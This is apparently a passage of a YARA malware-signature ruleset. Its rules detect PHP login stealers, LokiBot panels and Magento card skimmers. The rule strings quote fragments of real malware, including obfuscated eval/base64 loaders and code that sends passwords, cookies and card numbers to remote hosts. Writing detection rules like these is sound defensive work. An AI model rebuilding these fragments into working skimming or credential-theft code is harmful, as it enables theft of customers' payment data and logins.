rule php_malware_loginstealer_003_02 : malware
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('VY/dasJAEIXv"
    condition:
        $trigger
}

rule php_malware_loginstealer_003_03 : malware
{
    strings:
        $trigger = "eval(gzinflate(base64_decode(\"VZBvS8MwEMbf"
    condition:
        $trigger
}

rule php_malware_loginstealer_004 : malware
{
    strings:
        $trigger = "Rez by [ bajatax"
    condition:
        $trigger and PR00437 and PR00301 and PR01123
}

rule php_malware_loginstealer_006 : malware
{
    strings:
        $trigger = "data: 'ip=localhost&login=' + encodeURIComponent(login.val()) + '&password=' + encodeURIComponent(password.val()) + '&url="
    condition:
        $trigger and PR04015
}

private rule PR05049 : trigger
{
    strings:
        $ps0 = "curl_setopt ($ch, CURLOPT_TIMEOUT, $time_out);"
    condition:
        $ps0
}

private rule PR05050 : trigger
{
    strings:
        $ps0 = "['password']).\"&url=\".base64_encode"
    condition:
        $ps0
}

rule php_malware_loginstealer_007 : malware
{
    strings:
        $trigger = "aHR0"
    condition:
        $trigger and PR05049 and PR00091 and PR05050
}

private rule PR05051 : trigger
{
    strings:
        $ps0 = "aHR0"
    condition:
        $ps0
}

rule php_malware_loginstealer_007_02 : malware
{
    strings:
        $trigger = ".=\"&p=\".base64_encode($credentials['password']).\"&url=\".base64_encode($_SERVER['HTTP_HOST']).\"&ip=\".base64_encode($_SERVER[\"REMOTE_ADDR\"]);"
    condition:
        $trigger and PR05051
}

private rule PR05052 : trigger
{
    strings:
        $ps0 = "== \"encrypt\" ?"
    condition:
        $ps0
}

private rule PR05053 : trigger
{
    strings:
        $ps0 = "array(\"VerifyMethod\" => \"safe_verify\" , \"VerifyToken\" => "
    condition:
        $ps0
}

rule php_malware_loginstealer_008 : malware
{
    strings:
        $trigger = "str_rot13"
    condition:
        $trigger and PR01422 and PR05052 and PR05053
}

// MANUAL FIX NECESSARY
rule php_malware_loginstealer_008_02 : malware
{
    strings:
        $trigger = "array(\"VerifyMethod\" => \"safe_verify\" , \"VerifyToken\" => "
        $php_malware_loginstealer_008_02_r0 = /public\s+function\s+\w+\((\$\w+,\s+){3}\$\w+\)\s+\{\s+(\$\w+\s+=\s+base64_encode\(\$\w+\);\s+){4}\$\w+\s+=\s+base64_decode\(\\"\w+={1,2}\"\);\s+\$\w+\s+=\s+(\$\w+\s+\.\s+){4,6}\$\w+;[^\}]*\}/
    condition:
        $trigger and PR01422 and PR01372 and $php_malware_loginstealer_008_02_r0
}

rule php_malware_loginstealer_008_03 : malware
{
    strings:
        $trigger = "@gzuncompress(base64_decode(str_rot13($hash.$salt."
    condition:
        $trigger and PR05053
}

// MANUAL FIX NECESSARY
private rule PR05054 : trigger
{
    strings:
        $ps0 = "fwrite($fp, $logdetails);"
    condition:
        $ps0
}

rule php_malware_loginstealer_009 : malware
{
    strings:
        $trigger = "date(\"F j, Y, g:i a\") . ': ' . '<a href=http://www.ip-score.com/checkip/'.$ip.' target=_blank>'.$_SERVER['REMOTE_ADDR'].'</a> - '.$hostname.' - '.$user_agent.'<br>';"
        $php_malware_loginstealer_009_r0 = /file_get_contents\(.http/
    condition:
        $trigger and PR05054 and PR00357 and PR01431 and $php_malware_loginstealer_009_r0
}

rule php_malware_loginstealer_010 : malware
{
    strings:
        $trigger = "echo \"$target/wp-login.php#$user&$pass#\";"
    condition:
        $trigger and PR01330
}

rule php_malware_loginstealer_011 : malware
{
    strings:
        $trigger = "g\";$erp(0);$gznss=\"g"
    condition:
        $trigger and PR01350
}

rule php_malware_loginstealer_012 : malware
{
    strings:
        $trigger = "strpos($row3[0], '@') !== false) { echo base64_encode($row3[0])  . \"\\r\\n\""
    condition:
        $trigger and PR02155 and PR01431
}

private rule PR05055 : trigger
{
    strings:
        $ps0 = "$counts = array_count_values(file(\"./wp-includes/"
    condition:
        $ps0
}

rule php_malware_loginstealer_013 : malware
{
    strings:
        $trigger = "file_put_contents(\"./wp-includes/"
    condition:
        $trigger and PR05055
}

rule php_malware_loginstealer_013_02 : malware
{
    strings:
        $trigger = "(isset($counts[$_SERVER['REMOTE_ADDR']]) && $counts[$_SERVER['REMOTE_ADDR']] >"
    condition:
        $trigger and PR00435 and PR05055
}

private rule PR05056 : trigger
{
    strings:
        $ps0 = "$data .= $_POST['password'] . \"\\n\";"
    condition:
        $ps0
}

private rule PR05057 : trigger
{
    strings:
        $ps0 = "$fp = fopen($file, \"a\");"
    condition:
        $ps0
}

rule php_malware_loginstealer_014 : malware
{
    strings:
        $trigger = "$data .= gethostbyaddr($_SERVER['REMOTE_ADDR']) . \"\\n\";"
    condition:
        $trigger and PR05056 and PR05057
}

private rule PR05058 : trigger
{
    strings:
        $ps0 = "likes.php?new='.$access.'&id='.$userid.'&next='.$encode.'\" />';"
    condition:
        $ps0
}

rule php_malware_loginstealer_015 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR05058 and PR02062
}

rule php_malware_loginstealer_016 : malware
{
    strings:
        $trigger = "=bin2hex($"
    condition:
        $trigger and PR01553 and PR01401 and PR04667
}

rule php_malware_loginstealer_017 : malware
{
    strings:
        $trigger = "echo '<meta http-equiv=\"refresh\" content=\"0; URL=data.php?username=' . $_POST[\"user\"] . '&password=' . $_POST[\"password\"] . '&numero=' . $_POST[\"tel\"] . '\">';"
    condition:
        $trigger
}

private rule PR05059 : trigger
{
    strings:
        $ps0 = "\"].\"/\".$_SERVER[\""
    condition:
        $ps0
}

private rule PR05060 : trigger
{
    strings:
        $ps0 = "\";if(!empty($_POST)){${${\""
    condition:
        $ps0
}

rule php_malware_loginstealer_018 : malware
{
    strings:
        $trigger = "]});curl_close(${${\""
    condition:
        $trigger and PR05059 and PR05060 and PR00341
}

private rule PR05061 : trigger
{
    strings:
        $ps0 = "$is_admin = (array)wp_authenticate($user,$password);"
    condition:
        $ps0
}

private rule PR05062 : trigger
{
    strings:
        $ps0 = "if(isset($pst['log']) and isset($pst['pwd'])){"
    condition:
        $ps0
}

private rule PR05063 : trigger
{
    strings:
        $ps0 = "curl_init($uba);@curl_setopt($ch, CURLOPT_HEADER, 0);@curl_setopt"
    condition:
        $ps0
}

private rule PR05064 : trigger
{
    strings:
        $ps0 = ".=http_build_query($params);"
    condition:
        $ps0
}

rule php_malware_loginstealer_019 : malware
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR05061 and PR05062 and PR05063 and PR05064
}

rule php_malware_lokibot_001 : malware
{
    strings:
        $trigger = "if(!defined('IN_LOKI')) die(\"File not found.\");"
    condition:
        $trigger and PR02208
}

private rule PR05065 : trigger
{
    strings:
        $ps0 = "curl_setopt($ch, CURLOPT_POSTFIELDS, $post77);"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_001 : malware
{
    strings:
        $trigger = "Mage_"
    condition:
        $trigger and PR05065
}

rule php_malware_magentoccstealer_002 : malware
{
    strings:
        $trigger = "new Mage_Checkout_Block_Onepage_Billing;"
    condition:
        $trigger
}

private rule PR05066 : trigger
{
    strings:
        $ps0 = "$this->sendCcNumber();"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_002_02 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR05066 and PR00925
}

private rule PR05067 : trigger
{
    strings:
        $ps0 = "$this->ccNumberProccess();"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_002_03 : malware
{
    strings:
        $trigger = "Mage"
    condition:
        $trigger and PR05067
}

private rule PR05068 : trigger
{
    strings:
        $ps0 = "Mage_"
    condition:
        $ps0
}

private rule PR05069 : trigger
{
    strings:
        $ps0 = "or die(\"Error\");"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_002_04 : malware
{
    strings:
        $trigger = "fopen(getcwd()"
    condition:
        $trigger and PR05068 and PR05069
}

private rule PR05070 : trigger
{
    strings:
        $ps0 = "$data3"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_002_05 : malware
{
    strings:
        $trigger = "or die(\"Error\");"
    condition:
        $trigger and PR05070 and PR05068
}

private rule PR05071 : trigger
{
    strings:
        $ps0 = "'a+');"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_002_06 : malware
{
    strings:
        $trigger = "$data5 = $this->"
    condition:
        $trigger and PR05071 and PR05068
}

// MANUAL FIX NECESSARY
private rule PR05072 : trigger
{
    strings:
        $ps0 = "Mage_Checkout_Block_Onepage_Billing;"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_002_07 : malware
{
    strings:
        $trigger = "new Mage_Checkout_Block_Onepage_Billing"
        $php_malware_magentoccstealer_002_07_r0 = /public function [\w]+\(\)[\s]*\{[\s]*(\$[\w]+[\s]*=[^;]+;[\s]*)*\$[\w]+[\s]*=[\s]*new Mage/
    condition:
        $trigger and PR05072 and $php_malware_magentoccstealer_002_07_r0
}

rule php_malware_magentoccstealer_002_08 : malware
{
    strings:
        $trigger = "$this->sucuri_encrypted();"
    condition:
        $trigger and PR00925
}

private rule PR05073 : trigger
{
    strings:
        $ps0 = "md5($_SERVER['HTTP_HOST']);"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_002_09 : malware
{
    strings:
        $trigger = ".= $subkey(\"Q0MgOiA=\")"
    condition:
        $trigger and PR05068 and PR05073
}

rule php_malware_magentoccstealer_005 : malware
{
    strings:
        $trigger = "@eval(@str_rot13(@gzinflate(@str_rot13(@base64_decode(\"nZV4i9pAFIY/SvA"
    condition:
        $trigger
}

private rule PR05074 : trigger
{
    strings:
        $ps0 = "else { $country_code = $country_codes;"
    condition:
        $ps0
}

private rule PR05075 : trigger
{
    strings:
        $ps0 = "$_SERVER['HTTP_USER_AGENT'];"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_006 : malware
{
    strings:
        $trigger = "($customer->authenticate($username, $password))"
    condition:
        $trigger and PR05074 and PR04056 and PR05075
}

private rule PR05076 : trigger
{
    strings:
        $ps0 = "base64_decode('PD9QSFAgLyoqKiBNYWdlbnRvKiogTk9USUNFIE9GIExJ"
    condition:
        $ps0
}

private rule PR05077 : trigger
{
    strings:
        $ps0 = "Visbot"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_018 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR05076 and PR05077
}

private rule PR05078 : trigger
{
    strings:
        $ps0 = "if(preg_match("
    condition:
        $ps0
}

rule php_malware_magentoccstealer_021 : malware
{
    strings:
        $trigger = "@base64_encode(serialize($_REQUEST).\"--\".serialize($_COOKIE"
    condition:
        $trigger and PR00091 and PR05078
}

private rule PR05079 : trigger
{
    strings:
        $ps0 = "|$data8|"
    condition:
        $ps0
}

private rule PR05080 : trigger
{
    strings:
        $ps0 = "|$data3|"
    condition:
        $ps0
}

private rule PR05081 : trigger
{
    strings:
        $ps0 = "|$data7|"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_022 : malware
{
    strings:
        $trigger = "@file_get_contents"
    condition:
        $trigger and PR05068 and PR05079 and PR05080 and PR05081
}

private rule PR05082 : trigger
{
    strings:
        $ps0 = "$object = new Mage_Checkout_Block_Onepage_Billing;"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_022_02 : malware
{
    strings:
        $trigger = "|$data7|"
    condition:
        $trigger and PR05082 and PR05079 and PR05080
}

private rule PR05083 : trigger
{
    strings:
        $ps0 = "$data=validateDataFromStr($encrypt,$data);"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_023 : malware
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR05083
}

private rule PR05084 : trigger
{
    strings:
        $ps0 = "$ARINFO = $_POST;"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_024 : malware
{
    strings:
        $trigger = "Mage"
    condition:
        $trigger and PR05084
}

private rule PR05085 : trigger
{
    strings:
        $ps0 = "$data=base64_encode($data);"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_026 : malware
{
    strings:
        $trigger = "$data=json_encode(array('request'=>$_REQUEST"
    condition:
        $trigger and PR00391 and PR01514 and PR05085
}

private rule PR05086 : trigger
{
    strings:
        $ps0 = "* @package     Mage_Checkout"
    condition:
        $ps0
}

private rule PR05087 : trigger
{
    strings:
        $ps0 = "eval(gzinflate(base64_decode(str_rot13(strrev("
    condition:
        $ps0
}

rule php_malware_magentoccstealer_029 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR05086 and PR05087
}

private rule PR05088 : trigger
{
    strings:
        $ps0 = "http_build_query(array('utmp'=>$id,'utma'=>$key,'data'=>$data"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_031 : malware
{
    strings:
        $trigger = "setcookie(\"SESSIID\", $rand,time()+3600);"
    condition:
        $trigger and PR00391 and PR05088
}

private rule PR05089 : trigger
{
    strings:
        $ps0 = "if (preg_match('/report_search_grid/', base64_decode($_REQUEST['___directive'])))"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_032 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR05089 and PR00925
}

private rule PR05090 : trigger
{
    strings:
        $ps0 = "CWlmIChpc3NldCgkZGF0YVtiYXNlNjRfZGVjb2RlKCdZMk5mYm5WdFltVnkn"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_033 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR05090 and PR00925
}

private rule PR05091 : trigger
{
    strings:
        $ps0 = "eval(base64_decode(strrev($"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_035 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR05091 and PR00925
}

private rule PR05092 : trigger
{
    strings:
        $ps0 = "-BEGIN CERTIFICATE-"
    condition:
        $ps0
}

private rule PR05093 : trigger
{
    strings:
        $ps0 = "JPEG-1.1"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_036 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR05092 and PR05093 and PR00925
}

rule php_malware_magentoccstealer_037 : malware
{
    strings:
        $trigger = "_encode(var_export($_POST['billing'], true)).PHP_EOL, FILE_APPEND);} if (array_key_exists('payment', $_POST)) {file_put"
    condition:
        $trigger and PR00435
}

rule php_malware_magentoccstealer_039 : malware
{
    strings:
        $trigger = "post['cc_cvv2'].\"|\".$this->request->post['cc_number'];mail(\""
    condition:
        $trigger
}

private rule PR05094 : trigger
{
    strings:
        $ps0 = "$url = 'http:"
    condition:
        $ps0
}

private rule PR05095 : trigger
{
    strings:
        $ps0 = "curl_setopt($ch,CURLOPT_URL, $url);"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_040 : malware
{
    strings:
        $trigger = "public function saleCreated(Varien_Event_Observer $observer)"
    condition:
        $trigger and PR05094 and PR05095 and PR01700
}

private rule PR05096 : trigger
{
    strings:
        $ps0 = "echo '~mail|'.$row['email'].\"|\".$row['value'].\"<br/>\\n\";"
    condition:
        $ps0
}

private rule PR05097 : trigger
{
    strings:
        $ps0 = "echo \"<b>Number of cc quote payment:</b> \".strval($count[0]).\"<br/>\\n\";"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_042 : malware
{
    strings:
        $trigger = "decrypt"
    condition:
        $trigger and PR05096 and PR05097
}

private rule PR05098 : trigger
{
    strings:
        $ps0 = "@serialize($_POST).\"--\".@serialize($_COOKIE) ).\"\\n\", FILE_APPEND);"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_043 : malware
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR05098
}

private rule PR05099 : trigger
{
    strings:
        $ps0 = "array(\"q\"=>base64_encode(json_encode($data1))));"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_044 : malware
{
    strings:
        $trigger = "curl_post_async(base64_decode(\"http"
    condition:
        $trigger and PR05099 and PR04056
}

private rule PR05100 : trigger
{
    strings:
        $ps0 = "function curl_post_async($url, $params)"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_044_02 : malware
{
    strings:
        $trigger = "class Mage_"
    condition:
        $trigger and PR05100
}

private rule PR05101 : trigger
{
    strings:
        $ps0 = "<th >CC_OWNER"
    condition:
        $ps0
}

private rule PR05102 : trigger
{
    strings:
        $ps0 = "print_data(base64_decode($maildump))"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_045 : malware
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR05101 and PR05102
}

private rule PR05103 : trigger
{
    strings:
        $ps0 = "var|x44|x4A"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_048 : malware
{
    strings:
        $trigger = "5fd2x6"
    condition:
        $trigger and PR00677 and PR05103 and PR00604
}

private rule PR05104 : trigger
{
    strings:
        $ps0 = "if(isset($_POST['payment']['cc_number']) && $_POST['payment"
    condition:
        $ps0
}

private rule PR05105 : trigger
{
    strings:
        $ps0 = "$_POST['billing']['email'].\"\\r\\n\", FILE_APPEND);"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_051 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR01710 and PR05104 and PR05105 and PR00925
}

private rule PR05106 : trigger
{
    strings:
        $ps0 = "file_get_contents($url, false, $context);"
    condition:
        $ps0
}

private rule PR05107 : trigger
{
    strings:
        $ps0 = "$data=base64_encode(serialize(array('request'=>$_REQUEST,'ip'=>$_SERVER['REMOTE_ADDR'],'ua"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_051_02 : malware
{
    strings:
        $trigger = "$id=base64_encode("
    condition:
        $trigger and PR05106 and PR05107
}

private rule PR05108 : trigger
{
    strings:
        $ps0 = "$info->getCcOwner();"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_052 : malware
{
    strings:
        $trigger = "private function _storeInfos($file ="
    condition:
        $trigger and PR04056 and PR05108
}

private rule PR05109 : trigger
{
    strings:
        $ps0 = "$this->_storeInfos();"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_052_02 : malware
{
    strings:
        $trigger = "private function _storeInfos($file ="
    condition:
        $trigger and PR04056 and PR05109 and PR05108
}

rule php_malware_magentoccstealer_053 : malware
{
    strings:
        $trigger = "file_put_contents($container, \"\\n\".$this->encryptSession(json_encode($data)), FILE_APPEND);"
    condition:
        $trigger and PR04056
}

private rule PR05110 : trigger
{
    strings:
        $ps0 = "Mage::getSingleton("
    condition:
        $ps0
}

private rule PR05111 : trigger
{
    strings:
        $ps0 = "$tres = file_get_contents(\"$rcpt?data=$res&domain=$dmn\");"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_054 : malware
{
    strings:
        $trigger = "getCcNumber();"
    condition:
        $trigger and PR00435 and PR05110 and PR05111
}

private rule PR05112 : trigger
{
    strings:
        $ps0 = "Mage::"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_055 : malware
{
    strings:
        $trigger = "FILE_APPEND);"
    condition:
        $trigger and PR05112 and PR01560 and PR01874
}

rule php_malware_magentoccstealer_055_02 : malware
{
    strings:
        $trigger = "'info' => base64_encode($dvs),"
    condition:
        $trigger and PR00091
}

private rule PR05113 : trigger
{
    strings:
        $ps0 = "substr_replace($date['cc_number'],"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_055_03 : malware
{
    strings:
        $trigger = "FILE_APPEND);"
    condition:
        $trigger and PR05112 and PR00091 and PR01560 and PR05113
}

private rule PR05114 : trigger
{
    strings:
        $ps0 = "class Mage_Checkout_Model_Type_Onepage"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_056 : malware
{
    strings:
        $trigger = "','PaymentReport',$datasend);"
    condition:
        $trigger and PR05114
}

rule php_malware_magentoccstealer_057 : malware
{
    strings:
        $trigger = "file_put_contents('/tmp/out1', var_export($_REQUEST"
    condition:
        $trigger
}

private rule PR05115 : trigger
{
    strings:
        $ps0 = "stream_context_create(array('http'=>array('timeout"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_058 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR05115 and PR04522
}

private rule PR05116 : trigger
{
    strings:
        $ps0 = "$logger = @$_REQUEST"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_058_02 : malware
{
    strings:
        $trigger = "@include"
    condition:
        $trigger and PR05116
}

rule php_malware_magentoccstealer_060 : malware
{
    strings:
        $trigger = "eval(gzinflate(base64_decode(str_rot13(strrev('==jQAiL8PdIhRn6ElHerQmZgP"
    condition:
        $trigger
}

private rule PR05117 : trigger
{
    strings:
        $ps0 = "base64_encode(serialize"
    condition:
        $ps0
}

private rule PR05118 : trigger
{
    strings:
        $ps0 = "$_SERVER['REQUEST_URI'],\"onestepcheckout\")!==FALSE && $_POST[\"billing\"]"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_061 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR05117 and PR05118 and PR02597
}

private rule PR05119 : trigger
{
    strings:
        $ps0 = "die('ok"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_062 : malware
{
    strings:
        $trigger = ".php', false, $context);"
    condition:
        $trigger and PR05119 and PR03964
}

private rule PR05120 : trigger
{
    strings:
        $ps0 = "if(preg_match(\"#\".$ip_korban.\"#\", $preg_view"
    condition:
        $ps0
}

private rule PR05121 : trigger
{
    strings:
        $ps0 = "$situs = $evil_destination"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_063 : malware
{
    strings:
        $trigger = "Mage"
    condition:
        $trigger and PR05120 and PR05121
}

private rule PR05122 : trigger
{
    strings:
        $ps0 = "$paypal_fake = curl_exec($"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_063_02 : malware
{
    strings:
        $trigger = "Mage"
    condition:
        $trigger and PR05121 and PR05122
}

private rule PR05123 : trigger
{
    strings:
        $ps0 = ".split(\"\").reverse().join(\"\"))</script>"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_065 : malware
{
    strings:
        $trigger = "document.write("
        $php_malware_magentoccstealer_065_w0 = "post_content' => str_replace($string_to_test, '', $post->post_content)"
    condition:
        $trigger and PR05123 and PR00050 and not $php_malware_magentoccstealer_065_w0
}

private rule PR05124 : trigger
{
    strings:
        $ps0 = "if(isset($_POST['payment']) && isset($_POST['payment']['cc_exp_year'])"
    condition:
        $ps0
}

private rule PR05125 : trigger
{
    strings:
        $ps0 = "write($f, $payment['cc_number'].\"|\".$payment"
    condition:
        $ps0
}

private rule PR05126 : trigger
{
    strings:
        $ps0 = "billing = Mage::getSingleton"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_066 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR05124 and PR05125 and PR05126
}

// MANUAL FIX NECESSARY
rule php_malware_magentoccstealer_066_02 : malware
{
    strings:
        $trigger = " * @package  "
        $php_malware_magentoccstealer_066_02_r0 = /if\(isset\(\$_POST\[.payment.\]\)\s*\&\&\s*isset.\$_POST..payment.\]..cc_exp_year[^;]*;\s*\$\w+\s*[^:]*::getSingleton\(.checkout\/session.\)\-\>getQuote\(\)\-\>getBillingAddress\(\)\-\>getData\(\);\s*\}/
    condition:
        $trigger and PR05124 and PR05126 and $php_malware_magentoccstealer_066_02_r0
}

rule php_malware_magentoccstealer_067 : malware
{
    strings:
        $trigger = "private function _saveInfos()"
    condition:
        $trigger and PR04056
}

private rule PR05127 : trigger
{
    strings:
        $ps0 = "$pay.base64_decode($_COOKIE['__bill']));"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_068 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR00301 and PR02597 and PR05127
}

rule php_malware_magentoccstealer_068_02 : malware
{
    strings:
        $trigger = "$pay.base64_decode(\\$_COOKIE['__bill']));"
    condition:
        $trigger and PR00301
}

private rule PR05128 : trigger
{
    strings:
        $ps0 = "encode"
    condition:
        $ps0
}

private rule PR05129 : trigger
{
    strings:
        $ps0 = "version"
    condition:
        $ps0
}

private rule PR05130 : trigger
{
    strings:
        $ps0 = "exec(\"curl --data"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_069 : malware
{
    strings:
        $trigger = "serialize($_COOKIE) ).\"&host=\".$_SERVER[\"HTTP_HOST\""
    condition:
        $trigger and PR05128 and PR05129 and PR05130
}

// MANUAL FIX NECESSARY
rule php_malware_magentoccstealer_069_02 : malware
{
    strings:
        $trigger = "serialize($_COOKIE) ).\"&host=\".$_SERVER[\"HTTP_HOST\""
        $php_malware_magentoccstealer_069_02_r0 = /preg_match\([^\)]*base64_decode[^,]+,[^\)]+\$_/
    condition:
        $trigger and PR05128 and PR05129 and $php_malware_magentoccstealer_069_02_r0
}

private rule PR05131 : trigger
{
    strings:
        $ps0 = "implode(\"_\","
    condition:
        $ps0
}

rule php_malware_magentoccstealer_069_04 : malware
{
    strings:
        $trigger = "ini_set('display_errors', 0);"
    condition:
        $trigger and PR01758 and PR01179 and PR05131
}

// MANUAL FIX NECESSARY
rule php_malware_magentoccstealer_069_05 : malware
{
    strings:
        $trigger = "implode(\"_\","
        $php_malware_magentoccstealer_069_05_r0 = /\$[\w]+[\s]*=[\s]*implode\(\"_\",[\s]*array\([\"str\.]{4,}/
    condition:
        $trigger and PR01758 and PR01179 and $php_malware_magentoccstealer_069_05_r0
}

private rule PR05132 : trigger
{
    strings:
        $ps0 = "implode(base64_decode('Xw=="
    condition:
        $ps0
}

rule php_malware_magentoccstealer_069_06 : malware
{
    strings:
        $trigger = "if(!is_wp_error($user)){"
    condition:
        $trigger and PR01758 and PR01179 and PR05132
}

// MANUAL FIX NECESSARY
rule php_malware_magentoccstealer_069_07 : malware
{
    strings:
        $trigger = "serialize($_COOKIE) ).\"&host=\".$_SERVER[\"HTTP_HOST\""
        $php_malware_magentoccstealer_069_07_r0 = /@exec\(\"curl/
    condition:
        $trigger and PR05128 and PR05129 and $php_malware_magentoccstealer_069_07_r0
}

private rule PR05133 : trigger
{
    strings:
        $ps0 = "payment_form\" method=\"POST\" action=\"http"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_070 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR05133
}

rule php_malware_magentoccstealer_072 : malware
{
    strings:
        $trigger = "$_COOKIE[\"\\x66\\162\\157\\156\\x74\\x65\\x6e\\x64\"]; goto"
    condition:
        $trigger and PR02803
}

private rule PR05134 : trigger
{
    strings:
        $ps0 = ")]=hex2bin("
    condition:
        $ps0
}

rule php_malware_magentoccstealer_075 : malware
{
    strings:
        $trigger = ",);}}$GLOBALS["
    condition:
        $trigger and PR05134 and PR01490 and PR03877
}

private rule PR05135 : trigger
{
    strings:
        $ps0 = "@mail($_post,$billing->getCountry().\" Credit Card"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_076 : malware
{
    strings:
        $trigger = "class Mage_"
    condition:
        $trigger and PR05135
}

private rule PR05136 : trigger
{
    strings:
        $ps0 = "trim(base64_decode("
    condition:
        $ps0
}

private rule PR05137 : trigger
{
    strings:
        $ps0 = "array('app/Mage.php','lib/Varien/Autoload.php"
    condition:
        $ps0
}

private rule PR05138 : trigger
{
    strings:
        $ps0 = "@file_put_contents('/tmp"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_077 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR05136 and PR05137 and PR05138
}

private rule PR05139 : trigger
{
    strings:
        $ps0 = "\"datapost=\".($datasend);"
    condition:
        $ps0
}

private rule PR05140 : trigger
{
    strings:
        $ps0 = "$send"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_078 : malware
{
    strings:
        $trigger = "Mage_"
    condition:
        $trigger and PR05139 and PR05140
}

private rule PR05141 : trigger
{
    strings:
        $ps0 = "OnepageController.php\",base64_decode($"
    condition:
        $ps0
}

rule php_malware_magentoccstealer_079 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR05141 and PR01431
}

rule php_malware_magentoccstealer_081 : malware
{
    strings:
        $trigger = ".on(\"click\", \"#p_method_ccpayment"
    condition:
        $trigger and PR00647 and PR00634
}

private rule PR05142 : trigger
{
    strings:
        $ps0 = "$post = \"firstname=\".$info->firstname.\"&lastname=\".$info->lastname.\"&street1="
    condition:
        $ps0
}

rule php_malware_magentoccstealer_082 : malware
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR05142 and PR00925
}

rule php_malware_magentoccstealer_083 : malware
{
    strings:
        $trigger = "mysql_query(\"SELECT * FROM `mg_sales_flat_quote_address` WHERE `quote_id` = \".$"
    condition:
        $trigger and PR04059
}

private rule PR05143 : trigger
{
    strings:
        $ps0 = "<?php echo htmlspecialchars(@$_REQUEST["
    condition:
        $ps0
}

rule php_malware_magentoccstealer_083_02 : malware
{
    strings:
        $trigger = "<title>Sage Pay -"
    condition:
        $trigger and PR05143
}

private rule PR05144 : trigger
{
    strings:
        $ps0 = "'.$quoteObj->getBaseGrandTotal().'&url='.urlencode("
    condition:
        $ps0
}

rule php_malware_magentoccstealer_083_03 : malware
{
    strings:
        $trigger = "Mage"
    condition:
        $trigger and PR05144
}

rule php_malware_magentoccstealer_083_04 : malware
{
    strings:
        $trigger = "$quoteObj =  Mage::getSingleton('checkout/session')->getQuote();"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_malware_magentoccstealer_083_05 : malware
{
    strings:
        $trigger = "Mage"
        $php_malware_magentoccstealer_083_05_r0 = /\$\w+\s*=\s*Mage::GetBaseDir\(\)\s*;\s*require\s*\$\w+\.'[\/\w_-]+\.(php|js|asp)'\s*;/
    condition:
        $trigger and $php_malware_magentoccstealer_083_05_r0
}

rule php_malware_magentoccstealer_086 : malware
{
    strings:
        $trigger = ".$this->request->post['cc_number'].\"|\".$_SERVER['HTTP_HOST'];$"
    condition:
        $trigger and PR00341 and PR00342
}

private rule PR05145 : trigger
{
    strings:
        $ps0 = "getenv('REMOTE_ADDR')"
    condition:
        $ps0
}

private rule PR05146 : trigger
{
    strings:
        $ps0 = "\".$data['cc_type'].\" \".$"
    condition:
        $ps0
}

